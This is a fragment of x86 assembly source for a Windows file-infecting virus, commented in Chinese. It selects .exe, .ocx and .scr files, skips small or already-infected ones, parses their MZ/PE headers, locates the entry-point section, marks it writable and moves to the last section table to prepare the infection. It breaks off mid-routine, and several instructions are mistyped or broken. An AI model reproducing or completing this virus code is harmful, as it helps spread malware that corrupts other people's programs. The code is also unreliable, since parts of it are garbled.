
```asm
;********************************
mov esi,edi
add esi,2C

FT_01:
lodsb
or al,al
jnz short FT_01
mov eax,[esi -4]    ;扩展名判断
or eax,20202020
cmp eax,'xco' ;控件 4
jz short FT_02

cmp eax,'rcs'   ;屏幕保护文件
jz short FT_01

cmp eax,'exe' ;标准 exe 文件
jnz short FT_Exit

FT_02:
mov eax,[edi+20]  ;文件小于 2000 的就不感染
cmp eax,2000
jc short FT_Exit

cmp al,03   ;检测是否已经感染
jz short FT_Exit

lea esi,[offset Buffer1 + ebx]  ;取文件名和路径
lea edi,[offset Buffer3 + ebx]
push edi
mov ecx,CurrentDirEnd
sub ecx,esi
repz movsb
lea sei,[offset Buffer2 + ebx]
add esi,2C

FT_03:
movsb
cmp byte ptr [esi - 1],0
jnz short FT_03

call InfectFile

Ft_Exit:
jmp RS_Next

;********************************
;感染文件子程序
;********************************
InfectFile:
push i_Filename
push 03   ;打开文件
call OpenFile

cmp eax,-1
jz IN_Exit

mov i_FileHandle,eax

push 00
push eax
call GetFileSize   ;去文件的大小，用于以后还原

mov i_FileSize,eax

cmp al,03  ;是否感染
jz IN_Exit

lea edi,[offset Buffer3 +ebx]

push 00
lea esi,i_BytesRead
push esi
push 2000
push edi
push i_FileHandle
call ReadFile


;**************************
;以下程序与文件头有关
;**************************

cmp word ptr [edi],5A4Dh    ;dos 文件头
jnz IN_CloseFile            ;确保是感染的是 PE 文件
cmp word ptr [edi + 18],0040  ;是否是 windows 文件  ，此处>=40 为 windows 文件，<40H,则是 dos 文件

    jnz IN_CloseFile

    cmp dword ptr [edi + 3C],1C00
    ja IN_CloseFile
    cmp dword ptr [edi + 3C] ,1C00  ;dos 文件头的大小
    ja IN_CloseFile

    add edi [edi + 3C]   ;指向 PE 或者 NE 文件头

    mov eax,[edi]
    cmp eax,00004550      
    jnz IN_CloseFile      ;win3.x 的 18H 值也大于等于 40H，可是有用 3.x 的？和病毒出生的年代有关系吧:)

    cmp word ptr [edi+5C],2     ;GUI???
    jnz IN_CloseFile

    mov esi,edi
    add esi,18
    add si,[edi+14]        ;将 esi 指向第一个节表
    push esi

    mov eax,[edi+28]

IN_00:
    mov ecx,[esi+0C]
    add ecx,[esi+08]

    cmp eax,ecx
    jc short IN_01
    add esi,28
    cmp eax,ecx
    jc short IN_01
    add esi,28
    jmp short IN_00

IN_01:
    sub eax,[esi+0C]
    add eax,[esi+14]
    mov i_EP_Offset,eax

    or [esi+24],80000000       ;将它改为可写，这个是 windows 与 dos 在程序和数据段上的一个改变，使我 windows 病毒要注意的地方
    pop esi
    xor ecx,ecx
    mov cx,[edi+06]
    dec ecx
    mov eax,ecx
    mov edx,28
    mul edx
    add esi,eax   ;ESI 指向最后一个节表

    mov eax,[esi+24]
    cmp al,80  ;是否已经初始化
    jz IN_CloseFile
    or eax,8C000000
```
